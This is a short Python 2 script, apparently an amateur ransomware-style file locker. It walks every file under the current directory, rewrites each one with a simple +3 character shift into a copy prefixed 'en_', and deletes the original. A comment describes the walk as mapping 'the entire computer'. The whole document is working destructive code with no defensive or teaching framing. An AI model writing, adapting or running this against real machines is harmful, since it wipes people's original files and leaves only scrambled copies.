# imports 
import os

	# maps the entire computer
def create_file_list():
	file_list = []
	file = os.getcwd()
	folder = os.walk(os.getcwd())
	lenth = len(os.getcwd())
	for file in folder:
	    for i in range(len(file[2])):
	        y = file[0] +"/" + file[2][i]
	        y = y[lenth:]
	        if  y[0] == "/":
	            y = y[1:]
	            file_list.append(y)
	return file_list
	


def enrypt(x):
	error = 0
	for z in range(len(x)):
		f = open("en_" + x[z], 'w')
		with open(x[z], 'r') as file:
		    for i, line in enumerate(file):
		        try:
		            filename = line.rstrip('\n')
		            encrypt_string = ""
		            for char in range(len(filename)):
		            	encrypt_string = encrypt_string + char_encryt(filename[char])
		            f.write(encrypt_string  +"\n")
		        except Exception as e:
		        	error = 1
		        	print "error"
		        	print str(e)
		f.close()
		if error == 1:
			os.remove("en_" + x[z])
			error = 0
		else:
			os.remove(x[z])
		
def char_encryt(char):
    y = ord(char)
    y = y + 3
    if y >255:
        y = y - 256
    return chr(y)


if __name__ == "__main__":
	x = create_file_list()	
	enrypt(x)